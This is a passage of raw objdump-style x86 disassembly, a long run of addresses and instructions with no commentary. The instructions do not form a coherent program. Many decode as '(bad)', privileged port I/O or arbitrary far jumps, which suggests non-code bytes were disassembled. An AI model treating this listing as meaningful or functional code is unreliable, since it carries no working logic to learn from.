  41d059:	adc    BYTE PTR [esp+ecx*8+0x23e97d14],ch
  41d060:	jmp    0x41d0a1
  41d062:	add    eax,0x23e48508
  41d067:	stos   DWORD PTR es:[edi],eax
  41d068:	push   0x88889581
  41d06d:	pop    ebx
  41d06e:	leave  
  41d06f:	mov    ?,WORD PTR [esi]
  41d071:	(bad)  
  41d073:	out    0x1c,eax
  41d075:	mov    ebp,0x7cfb38fd
  41d07a:	sbb    eax,0x62beae0f
  41d07f:	fild   QWORD PTR [edx+0x1cfe2237]
  41d085:	rcr    DWORD PTR fs:[ecx],cl
  41d088:	add    DWORD PTR [esi+0x20],edx
  41d08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d08c:	test   DWORD PTR [eax+0x1f],ebx
  41d08f:	inc    edx
  41d090:	pop    edx
  41d091:	push   esp
  41d092:	je     0x41d06d
  41d094:	cmp    dl,ch
  41d096:	loope  0x41d10f
  41d098:	sub    al,0x2f
  41d09a:	jecxz  0x41d0da
  41d09c:	pop    edx
  41d09d:	fs in  al,0xeb
  41d0a0:	xor    eax,0xa984f52d
  41d0a5:	add    BYTE PTR [edx-0x65],cl
  41d0a8:	xchg   esp,eax
  41d0a9:	ds xchg ebx,eax
  41d0ab:	fwait
  41d0ac:	mov    ds:0x12aa90fd,eax
  41d0b1:	pushf  
  41d0b2:	in     eax,0x52
  41d0b4:	rcl    DWORD PTR [edx-0x5855d446],1
  41d0ba:	loope  0x41d054
  41d0bc:	and    DWORD PTR [ebp+0x57805007],ebx
  41d0c2:	test   al,0x95
  41d0c4:	adc    DWORD PTR [ebx],ebp
  41d0c6:	out    0x9b,al
  41d0c8:	jno    0x41d10c
  41d0ca:	lea    edx,[ecx+0x14e27fa3]
  41d0d0:	mov    dh,BYTE PTR [ecx+0xe43821a]
  41d0d6:	jg     0x41d0ff
  41d0d8:	(bad)  
  41d0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0db:	jle    0x41d139
  41d0dd:	sbb    eax,0x42a1f69c
  41d0e2:	retf   0xc1f8
  41d0e5:	sub    edi,ebx
  41d0e7:	sub    bl,BYTE PTR [ecx]
  41d0e9:	mov    edx,0x57c6020c
  41d0ee:	adc    al,bh
  41d0f0:	push   cs
  41d0f1:	nop
  41d0f2:	jecxz  0x41d0b5
  41d0f4:	out    0xe3,al
  41d0f6:	sub    edi,DWORD PTR [edx]
  41d0f8:	scas   al,BYTE PTR es:[edi]
  41d0f9:	inc    eax
  41d0fa:	xchg   ebp,eax
  41d0fb:	push   0xffffffb0
  41d0fd:	push   es
  41d0fe:	mul    DWORD PTR [esi-0x56]
  41d101:	and    edi,DWORD PTR [edi-0x1b]
  41d104:	push   0x8d2ea570
  41d109:	in     al,dx
  41d10a:	arpl   dx,sp
  41d10c:	test   BYTE PTR [eax],bl
  41d10e:	mov    eax,ds:0xb0d5a145
  41d113:	test   eax,0xcceefa78
  41d118:	out    dx,al
  41d119:	push   eax
  41d11a:	adc    edx,DWORD PTR [ebx-0x62]
  41d11d:	daa    
  41d11e:	neg    BYTE PTR [esi]
  41d120:	mov    dh,0x32
  41d122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d123:	xchg   esp,eax
  41d124:	or     DWORD PTR [ecx+0x60aa99df],eax
  41d12a:	push   esi
  41d12b:	(bad)  
  41d12c:	lods   eax,DWORD PTR ds:[esi]
  41d12d:	fst    QWORD PTR [eax-0x5a]
  41d130:	(bad)  
  41d131:	(bad)  [ebp-0x7352c889]
  41d137:	cmp    esi,0x6c
  41d13a:	pop    ebx
  41d13b:	sahf   
  41d13c:	int    0x39
  41d13e:	inc    BYTE PTR [esi+0x4fdf8e7f]
  41d144:	mov    al,0x3a
  41d146:	lahf   
  41d147:	das    
  41d148:	mov    ch,0x74
  41d14a:	call   ebx
  41d14c:	dec    ecx
  41d14d:	mov    esi,0x7c50e049
  41d152:	sub    esi,eax
  41d154:	jns    0x41d118
  41d156:	call   0x8346a0ed
  41d15b:	adc    bl,BYTE PTR [edi+0x54fcb3c1]
  41d161:	repnz xor dh,BYTE PTR [esi+0x17]
  41d165:	js     0x41d1c5
  41d167:	imul   dh
  41d169:	mov    ss,edx
  41d16b:	pop    eax
  41d16c:	aam    0x3c
  41d16e:	adc    ch,BYTE PTR [ebp+0x23618923]
  41d174:	fild   DWORD PTR [ecx]
  41d176:	test   eax,0x7806e44c
  41d17b:	inc    ebp
  41d17c:	ss pop ebp
  41d17e:	pop    ebp
  41d17f:	jmp    0x41d143
  41d181:	stc    
  41d182:	ret    
  41d183:	std    
  41d184:	rcr    edx,1
  41d186:	fbstp  TBYTE PTR [eax+0x12]
  41d189:	(bad)  
  41d18a:	inc    DWORD PTR [ecx+0x46ac318c]
  41d190:	fst    QWORD PTR [edi+0x2a]
  41d193:	(bad)  
  41d194:	push   ebp
  41d195:	pop    edx
  41d196:	mov    esi,0xc7f0624c
  41d19b:	mov    bl,0x75
  41d19d:	outs   dx,BYTE PTR ds:[esi]
  41d19e:	jg     0x41d120
  41d1a0:	pop    ebx
  41d1a1:	sahf   
  41d1a2:	lods   al,BYTE PTR ds:[esi]
  41d1a3:	adc    al,0x1d
  41d1a5:	mov    ch,0xd0
  41d1a7:	and    DWORD PTR [edi-0x4d],ecx
  41d1aa:	jmp    0x41d226
  41d1ac:	(bad)  
  41d1ae:	cdq    
  41d1af:	jmp    0x41d22d
  41d1b1:	cmc    
  41d1b2:	stc    
  41d1b3:	push   edx
  41d1b4:	(bad)  
  41d1b5:	push   ecx
  41d1b6:	das    
  41d1b7:	mov    al,0x3f
  41d1b9:	sub    ecx,ecx
  41d1bb:	xchg   esp,eax
  41d1bc:	into   
  41d1bd:	imul   ecx,esi,0x26
  41d1c0:	icebp  
  41d1c1:	push   cs
  41d1c2:	(bad)  
  41d1c3:	xchg   esp,eax
  41d1c4:	jmp    0xae8d:0xf656baa9
  41d1cb:	add    eax,0x39b28ea0
  41d1d0:	bound  eax,QWORD PTR [ebx+0x73]
  41d1d3:	pop    eax
  41d1d4:	mov    eax,ds:0x62169d5
  41d1d9:	mov    WORD PTR ds:0xa5e6f929,fs
  41d1df:	rcr    BYTE PTR [eax+0x436e3255],1
  41d1e5:	icebp  
  41d1e6:	add    eax,0xfef96ad8
  41d1eb:	aaa    
  41d1ec:	jmp    0x41d1e2
  41d1ee:	cmp    esi,DWORD PTR [edi-0x329222d1]
  41d1f4:	(bad)  
  41d1f5:	loop   0x41d1fa
  41d1f7:	pop    ecx
  41d1f8:	pop    edx
  41d1f9:	imul   ebx,DWORD PTR [eax-0x3f],0xffffffbc
  41d1fd:	mov    al,0x63
  41d1ff:	xor    DWORD PTR [edx-0x453d0eec],ecx
  41d205:	test   al,0x1d
  41d207:	in     al,dx
  41d208:	push   ss
  41d209:	inc    BYTE PTR [ebx]
  41d20b:	int    0x85
  41d20d:	fwait
  41d20e:	and    DWORD PTR [edx+edx*2-0x27b63d9c],edx
  41d215:	loopne 0x41d255
  41d217:	cdq    
  41d218:	xor    al,0x8c
  41d21a:	aas    
  41d21b:	cmp    ch,BYTE PTR [edi]
  41d21d:	es jns 0x41d202
  41d220:	xchg   ebx,eax
  41d221:	or     al,0xe2
  41d223:	inc    esp
  41d224:	outs   dx,DWORD PTR ds:[esi]
  41d225:	jge    0x41d236
  41d227:	bswap  ebx
  41d229:	jae    0x41d1af
  41d22b:	pop    esi
  41d22c:	es clc 
  41d22e:	stos   DWORD PTR es:[edi],eax
  41d22f:	cmp    edx,ecx
  41d231:	jl     0x41d243
  41d233:	repz adc ecx,DWORD PTR [edx]
  41d236:	(bad)  
  41d238:	jno    0x41d25f
  41d23a:	fbld   TBYTE PTR [eax+ebx*1-0x1c]
  41d23e:	jmp    0x6256c932
  41d243:	mov    ebp,0xcf1d2c8b
  41d248:	(bad)  [eax+0x78]
  41d24b:	xor    cl,BYTE PTR [esi-0x53421672]
  41d251:	adc    eax,DWORD PTR [edi-0x12]
  41d254:	scas   al,BYTE PTR es:[edi]
  41d255:	jl     0x41d203
  41d257:	or     eax,0x224a6b6e
  41d25c:	push   es
  41d25d:	add    al,0x57
  41d25f:	mov    bh,0xf2
  41d261:	sar    BYTE PTR [edx+ebx*8],0x5f
  41d265:	mov    bh,0xc2
  41d267:	dec    eax
  41d268:	xchg   ebp,eax
  41d269:	cli    
  41d26a:	lock mov eax,ds:0xa3673696
  41d270:	xchg   edx,eax
  41d271:	(bad)  
  41d272:	retf   
  41d273:	mov    ebx,0xd8a720ae
  41d278:	push   0xffffffcd
  41d27a:	fisttp DWORD PTR [esi-0x62]
  41d27d:	in     al,0xc1
  41d27f:	mov    dh,0x96
  41d281:	not    BYTE PTR [ebx+eax*2-0xd6cdf19]
  41d288:	inc    edi
  41d289:	inc    edx
  41d28a:	mov    ebp,0x9bf28555
  41d28f:	and    ah,dl
  41d291:	push   eax
  41d292:	adc    eax,esi
  41d294:	cmp    al,0x8c
  41d296:	rsqrtps xmm6,XMMWORD PTR [eax-0x1ba73b2a]
  41d29d:	and    al,0xb8
  41d29f:	inc    ecx
  41d2a0:	push   cs
  41d2a1:	addr16 in al,0xcb
  41d2a4:	hlt    
  41d2a5:	dec    esi
  41d2a6:	(bad)  
  41d2a7:	xchg   ebp,eax
  41d2a8:	add    al,0xc6
  41d2aa:	aam    0x6b
  41d2ac:	out    0x55,al
  41d2ae:	call   0x8b67:0x86e68619
  41d2b5:	in     al,dx
  41d2b6:	call   FWORD PTR [edx+0x15]
  41d2b9:	sbb    al,0x45
  41d2bb:	cmp    BYTE PTR [ebp-0x55],0x1f
  41d2bf:	inc    esp
  41d2c0:	cmp    BYTE PTR [ecx+ebp*4+0x55],0xb0
  41d2c5:	call   0xd2ba05ce
  41d2ca:	push   ds
  41d2cb:	ja     0x41d2d4
  41d2cd:	dec    edi
  41d2ce:	mov    ah,0xb0
  41d2d0:	dec    ebp
  41d2d1:	mov    ebp,0x1f239cd9
  41d2d6:	adc    al,0xdb
  41d2d8:	popa   
  41d2d9:	imul   eax,DWORD PTR [ebx],0x7c
  41d2dc:	jb     0x41d34b
  41d2de:	xor    ah,BYTE PTR [esi+0x1e4f2543]
  41d2e4:	fcomp  DWORD PTR [eax*2-0x138414ae]
  41d2eb:	daa    
  41d2ec:	xchg   ecx,eax
  41d2ed:	jo     0x41d2de
  41d2ef:	rol    BYTE PTR [ebp+0x1fd808ce],cl
  41d2f5:	mov    ebp,0x405ea029
  41d2fa:	sub    ebx,edi
  41d2fc:	mov    ebp,0x9d6768a5
  41d301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d302:	cwde   
  41d303:	push   cs
  41d304:	fidiv  DWORD PTR [esp+edx*1]
  41d307:	mov    ebp,0xb706e49
  41d30c:	mov    eax,ds:0xcb323081
  41d311:	add    dl,BYTE PTR [eax+0x43ed8189]
  41d317:	xor    al,0x5
  41d319:	in     al,0x39
  41d31b:	ds jne 0x41d317
  41d31e:	jbe    0x41d332
  41d320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d321:	sub    cl,ch
  41d323:	out    0x71,al
  41d325:	je     0x41d2fb
  41d327:	cmp    DWORD PTR [edx+0x6],edi
  41d32a:	loop   0x41d39a
  41d32c:	into   
  41d32d:	mov    esi,0x9a36078f
  41d332:	cmp    eax,ebx
  41d334:	adc    ebx,DWORD PTR [edx-0x2]
  41d337:	push   0xffffffc0
  41d339:	mov    ebp,0x8cc11e97
  41d33e:	(bad)  
  41d33f:	jmp    FWORD PTR [esi]
  41d341:	lods   eax,DWORD PTR ds:[esi]
  41d342:	popf   
  41d343:	hlt    
  41d344:	sbb    DWORD PTR ds:0x3453066,0xe4d65844
  41d34e:	test   BYTE PTR [esp+eiz*8-0x365abaf4],0x67
  41d356:	mov    bl,0xcc
  41d358:	loopne 0x41d317
  41d35a:	lds    edx,FWORD PTR [eax]
  41d35c:	jg     0x41d38a
  41d35e:	pop    edi
  41d35f:	shl    DWORD PTR [ebp-0x78],0x44
  41d363:	add    BYTE PTR cs:[ecx+0x76e52db6],bh
  41d36a:	and    edx,ecx
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	(bad)  
  41d36e:	jb     0x41d372
  41d370:	mov    ds:0x12248187,al
  41d375:	jnp    0x41d305
  41d377:	pop    ss
  41d378:	addr16 popa 
  41d37a:	stc    
  41d37b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d37c:	push   ss
  41d37d:	stos   BYTE PTR es:[edi],al
  41d37e:	mov    esi,0xe287203d
  41d383:	mov    bl,al
  41d385:	xchg   ecx,eax
  41d386:	cmp    eax,0x82907f7
  41d38b:	js     0x41d3e0
  41d38d:	(bad)  
  41d38e:	mov    ?,WORD PTR [ebp+0x54776a6d]
  41d394:	dec    esp
  41d395:	cmp    eax,DWORD PTR [ecx]
  41d397:	dec    esi
  41d398:	mov    edx,0x1fdf6bd9
  41d39d:	aaa    
  41d39e:	jnp    0x41d3d0
  41d3a0:	cld    
  41d3a1:	add    DWORD PTR [ebp+0x7040faf3],0xd7677bb3
  41d3ab:	scas   eax,DWORD PTR es:[edi]
  41d3ac:	imul   ecx,edi,0xa4086d52
  41d3b2:	and    DWORD PTR [esi+0x3929fb0],edx
  41d3b8:	sti    
  41d3b9:	mov    eax,0x44ffe465
  41d3be:	mov    ebp,0x7dcae4c4
  41d3c3:	in     al,0xa4
  41d3c5:	sub    bh,BYTE PTR [edx+0x69]
  41d3c8:	mov    al,ds:0x6e731ddb
  41d3cd:	sub    al,0xfe
  41d3cf:	push   edi
  41d3d0:	inc    edi
  41d3d1:	xchg   ebx,eax
  41d3d2:	in     eax,dx
  41d3d3:	jmp    0x41d3c3
  41d3d5:	gs push 0x41
  41d3d8:	frstor [ebx]
  41d3da:	pop    edi
  41d3db:	std    
  41d3dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3dd:	lods   eax,DWORD PTR ds:[esi]
  41d3de:	clc    
  41d3df:	cmc    
  41d3e0:	daa    
  41d3e1:	xor    eax,0x8b7656d9
  41d3e6:	mov    WORD PTR [edi],es
  41d3e8:	pop    esp
  41d3e9:	xor    eax,0x7e654375
  41d3ee:	call   0xfd4c8851
  41d3f3:	aaa    
  41d3f4:	xchg   DWORD PTR [edi+0x67],esi
  41d3f7:	mov    edx,DWORD PTR [esi+0xc384688]
  41d3fd:	xchg   ecx,eax
  41d3fe:	jnp    0x41d3af
  41d400:	add    bp,dx
  41d403:	into   
  41d404:	not    DWORD PTR [ebp+0x44e39586]
  41d40a:	adc    al,BYTE PTR [ebx]
  41d40c:	sub    cl,BYTE PTR [ebx]
  41d40e:	cmp    edi,ebp
  41d410:	push   cs
  41d411:	cmp    eax,0x2477825c
  41d416:	test   DWORD PTR [eax],ebx
  41d418:	push   edx
  41d419:	into   
  41d41a:	mov    edi,0x6b35a67
  41d41f:	or     BYTE PTR [ebx],ah
  41d421:	dec    ebp
  41d422:	in     al,0x5b
  41d424:	jae    0x41d454
  41d426:	aas    
  41d427:	mov    ds:0x7aee09be,eax
  41d42c:	sbb    eax,0x59eab6e1
  41d431:	pop    edi
  41d432:	shl    BYTE PTR [ebx-0x339da675],0x5c
  41d439:	dec    edx
  41d43a:	leave  
  41d43b:	mov    ds:0x65440de9,eax
  41d440:	das    
  41d441:	sub    BYTE PTR [ebx],ah
  41d443:	cli    
  41d444:	xchg   esp,eax
  41d445:	ja     0x41d3e6
  41d447:	jmp    0x41d498
  41d449:	stos   DWORD PTR es:[edi],eax
  41d44a:	dec    ebp
  41d44b:	mov    al,es:0x3dc84632
  41d451:	xor    al,0xf8
  41d453:	clts   
  41d455:	sbb    ch,BYTE PTR [ebx]
  41d457:	stos   BYTE PTR es:[edi],al
  41d458:	jp     0x41d4d0
  41d45a:	xor    edx,ebx
  41d45c:	push   0x17
  41d45e:	in     al,dx
  41d45f:	sbb    DWORD PTR [ecx+0x36],ebx
  41d462:	jmp    0x41d421
  41d464:	mov    edx,0x23615aa
  41d469:	dec    eax
  41d46a:	xchg   cl,al
  41d46c:	aam    0xd8
  41d46e:	cwde   
  41d46f:	out    0xce,al
  41d471:	fld    QWORD PTR [eax-0x1e]
  41d474:	add    esp,DWORD PTR [ebx+0x5be851e3]
  41d47a:	sub    DWORD PTR [eax+0x3b4217b7],esp
  41d480:	add    BYTE PTR [ebp-0x4c],dh
  41d483:	add    dh,BYTE PTR [ebp-0x68]
  41d486:	std    
  41d487:	fwait
  41d488:	mov    BYTE PTR [eax-0x48229c06],bl
  41d48e:	hlt    
  41d48f:	setb   BYTE PTR [ecx-0x63]
  41d493:	push   ecx
  41d494:	in     al,0x88
  41d496:	mov    eax,ds:0xe51b1bf9
  41d49b:	sbb    bl,BYTE PTR [ebp+0x5f1186aa]
  41d4a1:	push   cs
  41d4a2:	adc    bl,ah
  41d4a4:	scas   eax,DWORD PTR es:[edi]
  41d4a5:	dec    BYTE PTR [ebx+0x42c076c]
  41d4ab:	popa   
  41d4ac:	jns    0x41d486
  41d4ae:	out    dx,eax
  41d4af:	(bad)  
  41d4b0:	and    BYTE PTR [esi-0x69],cl
  41d4b3:	inc    eax
  41d4b4:	sub    eax,0xbfc685e1
  41d4b9:	fsub   st(3),st
  41d4bb:	xor    BYTE PTR [ebx-0x1132e6d5],ch
  41d4c1:	stos   BYTE PTR es:[edi],al
  41d4c2:	push   edi
  41d4c3:	or     DWORD PTR [esi],edx
  41d4c5:	xchg   ebp,eax
  41d4c6:	scas   al,BYTE PTR es:[edi]
  41d4c7:	dec    esi
  41d4c8:	xor    al,0x3e
  41d4ca:	(bad)  [ecx+0x7d]
  41d4cd:	sub    BYTE PTR [ecx+0x4],dh
  41d4d0:	or     bh,ch
  41d4d2:	xor    edx,DWORD PTR [esi+0x5361a668]
  41d4d8:	mov    bh,0x9e
  41d4da:	sbb    al,0x52
  41d4dc:	inc    ecx
  41d4dd:	ds dec edx
  41d4df:	jmp    0x652c:0x2bbd37ae
  41d4e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4e7:	imul   ebx,DWORD PTR [edi+0x7bf81328],0x41
  41d4ee:	xchg   ebx,eax
  41d4ef:	jb     0x41d566
  41d4f1:	push   es
  41d4f2:	pop    ss
  41d4f3:	idiv   BYTE PTR [ebx]
  41d4f5:	xor    esi,DWORD PTR ds:0x498ab674
  41d4fb:	inc    DWORD PTR [edi]
  41d4fd:	sub    BYTE PTR [edi],cl
  41d4ff:	call   0x43b878cc
  41d504:	push   0x60
  41d506:	jbe    0x41d4b3
  41d508:	(bad)  
  41d509:	ficom  DWORD PTR [edi+0x6d]
  41d50c:	xchg   DWORD PTR [ebx+0xe926b83],ecx
  41d512:	push   es
  41d513:	xchg   ebx,eax
  41d514:	outs   dx,BYTE PTR ds:[esi]
  41d515:	cmp    cl,dh
  41d517:	jno    0x41d4dd
  41d519:	pop    edx
  41d51a:	call   0x435777bb
  41d51f:	leave  
  41d520:	mov    WORD PTR [ecx-0x71],cs
  41d523:	cmp    ch,BYTE PTR [esi-0x70]
  41d526:	leavew 
  41d528:	(bad)  
  41d52b:	lds    edx,FWORD PTR [ebx+0x747fea5b]
  41d531:	inc    ebx
  41d532:	xchg   ebp,eax
  41d533:	test   eax,0xef53ec5a
  41d538:	adc    DWORD PTR [ebp+0x182d2e10],edx
  41d53e:	shl    DWORD PTR [ecx+0x7afaff21],0x64
  41d545:	or     DWORD PTR [ebx+0x15befcf3],ecx
  41d54b:	(bad)  
  41d54c:	fsubr  DWORD PTR [ebx+0x21761c11]
  41d552:	push   esi
  41d553:	ds adc edi,esp
  41d556:	outs   dx,DWORD PTR ds:[esi]
  41d557:	push   0x46e2470b
  41d55c:	mov    dh,0xe3
  41d55e:	in     al,dx
  41d55f:	sbb    esi,edx
  41d561:	repnz out dx,eax
  41d563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d564:	push   edi
  41d565:	xchg   esp,eax
  41d566:	rcl    DWORD PTR [edx],1
  41d568:	xchg   edi,eax
  41d569:	mov    dh,0xa2
  41d56b:	and    BYTE PTR [esi],ah
  41d56d:	mov    ds:0xb23faa75,eax
  41d572:	xchg   ebp,eax
  41d573:	fcom   QWORD PTR [esi+0x5d]
  41d576:	xchg   DWORD PTR ds:0x7d4f4080,edi
  41d57c:	(bad)  
  41d57d:	or     edx,DWORD PTR [ebp+0x40]
  41d580:	call   0x6e99823b
  41d585:	push   ds
  41d586:	cmp    al,0xd4
  41d588:	mov    ecx,0x49a7977c
  41d58d:	dec    eax
  41d58e:	xor    ah,cl
  41d590:	push   esp
  41d591:	jle    0x41d575
  41d593:	cld    
  41d594:	popf   
  41d595:	clc    
  41d596:	shr    BYTE PTR [ebp+edi*2-0x22ceaa79],0xbd
  41d59e:	mov    ss,WORD PTR [eax+ebp*2+0xe80ba78]
  41d5a5:	mov    ch,0x5d
  41d5a7:	sti    
  41d5a8:	out    0x7e,eax
  41d5aa:	clc    
  41d5ab:	mov    edi,0x49cf4bde
  41d5b0:	xchg   ebp,eax
  41d5b1:	jno    0x41d57c
  41d5b3:	in     al,0xab
  41d5b5:	pop    ss
  41d5b6:	out    dx,al
  41d5b7:	jge    0x41d566
  41d5b9:	jg     0x41d602
  41d5bb:	sub    ecx,DWORD PTR [eax-0x1eb1d4bd]
  41d5c1:	push   edi
  41d5c2:	mov    esp,0x57a6bc30
  41d5c7:	stos   BYTE PTR es:[edi],al
  41d5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c9:	pop    eax
  41d5ca:	ds pop ss
  41d5cc:	jp     0x41d62e
  41d5ce:	ret    0xf1f9
  41d5d1:	sub    eax,0x142d73c6
  41d5d6:	outs   dx,DWORD PTR ds:[esi]
  41d5d7:	sbb    bl,cl
  41d5d9:	xchg   ebp,eax
  41d5da:	add    al,0x73
  41d5dc:	cmp    BYTE PTR [edi],bl
  41d5de:	fdivr  DWORD PTR [esi-0x57]
  41d5e1:	ins    DWORD PTR es:[edi],dx
  41d5e2:	les    esi,FWORD PTR [edi]
  41d5e4:	mov    dl,0xe
  41d5e6:	jl     0x41d638
  41d5e8:	jle    0x41d5bc
  41d5ea:	(bad)  
  41d5eb:	adc    DWORD PTR [ecx],eax
  41d5ed:	add    bh,BYTE PTR [ebx+0x7c]
  41d5f0:	sbb    eax,0x652754d6
  41d5f5:	das    
  41d5f6:	daa    
  41d5f7:	in     al,0x15
  41d5f9:	and    al,0xd
  41d5fb:	xor    bl,BYTE PTR [ebx+0x6bc36836]
  41d601:	jne    0x41d647
  41d603:	dec    esp
  41d604:	sub    DWORD PTR [ecx],edx
  41d606:	inc    ecx
  41d607:	push   0xffffff8f
  41d609:	push   esp
  41d60a:	call   0x8f5a:0x427cbbb1
  41d611:	pop    ebx
  41d612:	pop    esp
  41d613:	sbb    al,0xad
  41d615:	inc    ecx
  41d616:	cmp    ebp,DWORD PTR [esi-0x20]
  41d619:	test   eax,0x3bdec986
  41d61e:	mov    eax,0xd43b1a5b
  41d623:	and    al,0x57
  41d625:	shl    DWORD PTR [edx],0xc1
  41d628:	pop    esp
  41d629:	sti    
  41d62a:	mov    edx,DWORD PTR [ebx+ecx*1]
  41d62d:	cmp    esp,DWORD PTR [edx+0x28]
  41d630:	in     al,dx
  41d631:	xlat   BYTE PTR ds:[ebx]
  41d632:	jg     0x41d5dc
  41d634:	xchg   edx,eax
  41d635:	dec    esp
  41d636:	xor    BYTE PTR [edx],0xcd
  41d639:	int3   
  41d63a:	inc    edx
  41d63b:	xor    ebx,DWORD PTR [eax]
  41d63d:	iret   
  41d63e:	cmp    al,0x63
  41d640:	retf   
  41d641:	mov    al,ds:0xd5baf195
  41d646:	imul   esi,DWORD PTR [ebx+0x4e],0x2ee8dae2
  41d64d:	popa   
  41d64e:	ret    
  41d64f:	pop    ebx
  41d650:	push   ecx
  41d651:	inc    ecx
  41d652:	mov    dh,0xe7
  41d654:	sbb    bh,BYTE PTR [esi+edx*4]
  41d657:	loope  0x41d6c7
  41d659:	inc    esp
  41d65a:	add    BYTE PTR [eax],0xcd
  41d65d:	and    al,0x5e
  41d65f:	or     esi,esp
  41d661:	stc    
  41d662:	(bad)  
  41d663:	mov    DWORD PTR [edx],ebx
  41d665:	mov    bh,0xe3
  41d667:	jmp    0xf4d9:0x611c2c40
  41d66e:	xor    edx,DWORD PTR [esi+0xe9362d9]
  41d674:	or     bh,BYTE PTR [edx]
  41d676:	popa   
  41d677:	test   eax,0x5d2ad47b
  41d67c:	lods   eax,DWORD PTR cs:[esi]
  41d67e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d67f:	js     0x41d6a6
  41d681:	mov    ch,bh
  41d683:	inc    edx
  41d684:	mov    dh,0x8f
  41d686:	mov    DWORD PTR [edi-0x3a],0x6a60c461
  41d68d:	rol    bl,1
  41d68f:	xchg   ecx,eax
  41d690:	or     ebp,DWORD PTR [esi+ebp*1+0x21]
  41d694:	stc    
  41d695:	(bad)  
  41d696:	jbe    0x41d624
  41d698:	jo     0x41d6a3
  41d69a:	pop    ecx
  41d69b:	imul   ecx,DWORD PTR [eax],0xffffff8d
  41d69e:	shl    BYTE PTR [edi+0x7e3cd80b],cl
  41d6a4:	lds    ecx,FWORD PTR [ecx+0x77981c8e]
  41d6aa:	in     eax,0x74
  41d6ac:	jecxz  0x41d713
  41d6ae:	push   esi
  41d6af:	mov    al,BYTE PTR [ebp+esi*2-0x3c]
  41d6b3:	popa   
  41d6b4:	and    esp,DWORD PTR [edx-0x64]
  41d6b7:	mov    cl,0xca
  41d6b9:	pop    ecx
  41d6ba:	pushf  
  41d6bb:	and    dl,BYTE PTR [ebx+0x13]
  41d6be:	adc    eax,0xd89ffe62
  41d6c3:	and    DWORD PTR [ecx-0x7c],0xffffffa1
  41d6c7:	loopne 0x41d678
  41d6c9:	adc    cl,ch
  41d6cb:	outs   dx,BYTE PTR ds:[esi]
  41d6cc:	mov    edx,0x11a3f29c
  41d6d1:	add    bl,0xa9
  41d6d4:	inc    esp
  41d6d5:	jg     0x41d706
  41d6d7:	popf   
  41d6d8:	dec    ebp
  41d6d9:	dec    eax
  41d6da:	and    BYTE PTR [eax],al
  41d6dc:	xor    dl,BYTE PTR [esi-0x752e0605]
  41d6e2:	pop    esp
  41d6e3:	xor    al,0x9f
  41d6e5:	cdq    
  41d6e6:	xchg   DWORD PTR [edi],esp
  41d6e8:	shl    eax,1
  41d6ea:	int3   
  41d6eb:	fstp   TBYTE PTR [esi+0x33]
  41d6ee:	sub    al,0x6a
  41d6f0:	add    DWORD PTR [ebx+0x75e4d72a],ebp
  41d6f6:	inc    ebx
  41d6f7:	aaa    
  41d6f8:	xchg   esp,eax
  41d6f9:	les    ebp,FWORD PTR [eax-0x36]
  41d6fc:	dec    esp
  41d6fd:	aaa    
  41d6fe:	mov    BYTE PTR [esi-0x39],ch
  41d701:	imul   ebx,DWORD PTR [esi+0x71ae73d9],0x68e3496f
  41d70b:	add    bh,bh
  41d70d:	push   edx
  41d70e:	stc    
  41d70f:	xor    ebx,DWORD PTR [ebx+edx*4+0x7a]
  41d713:	aad    0x6e
  41d715:	xchg   edi,eax
  41d716:	ds test al,0x51
  41d719:	xchg   ebx,eax
  41d71a:	adc    al,0x53
  41d71c:	mov    ecx,0x20dc2bc8
  41d721:	call   0xcaca6ec6
  41d726:	fcomp  DWORD PTR [eax-0x18476ebd]
  41d72c:	fwait
  41d72d:	iret   
  41d72e:	ror    DWORD PTR [edi],1
  41d730:	ror    DWORD PTR [eax+0x57aade1f],1
  41d736:	jo     0x41d7a8
  41d738:	or     DWORD PTR [ebp+edx*4+0x41184b24],esp
  41d73f:	(bad)  
  41d740:	push   cs
  41d741:	jnp    0x41d7b4
  41d743:	sub    al,0xdc
  41d745:	out    dx,eax
  41d746:	ss inc ebx
  41d748:	inc    ebp
  41d749:	jno    0x41d745
  41d74b:	scas   eax,DWORD PTR es:[edi]
  41d74c:	je     0x41d78b
  41d74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d74f:	rol    BYTE PTR [edi+0x5f8a9769],0xfb
  41d756:	int3   
  41d757:	cmp    edi,ebx
  41d759:	stc    
  41d75a:	mov    eax,0xfe8ead3a
  41d75f:	sbb    esp,edi
  41d761:	test   eax,0x4adf6f45
  41d766:	and    eax,0xec2165e1
  41d76b:	bound  edi,QWORD PTR [esi+0x1d1ee885]
  41d771:	pop    ebp
  41d772:	cwde   
  41d773:	cmp    eax,edx
  41d775:	shr    DWORD PTR [esi-0x1d],0x8d
  41d779:	imul   eax,DWORD PTR [ecx-0x69885fd],0x84d942b8
  41d783:	pushf  
  41d784:	adc    bh,0x7a
  41d787:	sub    al,0x27
  41d789:	jno    0x41d7f5
  41d78b:	sub    DWORD PTR [esi+esi*1-0x33],0x610bed73
  41d793:	jl     0x41d783
  41d795:	mov    ebp,0x28a121c8
  41d79a:	outs   dx,BYTE PTR ds:[esi]
  41d79b:	mov    dh,BYTE PTR [eax]
  41d79d:	in     eax,0xd9
  41d79f:	or     esp,esp
  41d7a1:	add    eax,0x13ce419
  41d7a6:	sbb    esi,DWORD PTR [esi-0xb]
  41d7a9:	pop    ds
  41d7aa:	pop    ss
  41d7ab:	call   0x65fa:0x2025e5b8
  41d7b2:	or     ecx,DWORD PTR [edi+0x2d3dd5a7]
  41d7b8:	fsin   
  41d7ba:	mov    ah,0xaa
  41d7bc:	jmp    0xcd04:0xb4005347
  41d7c3:	test   BYTE PTR [ecx],dh
  41d7c5:	in     al,0xd3
  41d7c7:	mov    ds:0xa72ad51b,al
  41d7cc:	jmp    0xc9aee7e6
  41d7d1:	retf   0xf246
  41d7d4:	add    eax,0x772d35f5
  41d7d9:	fwait
  41d7da:	cmc    
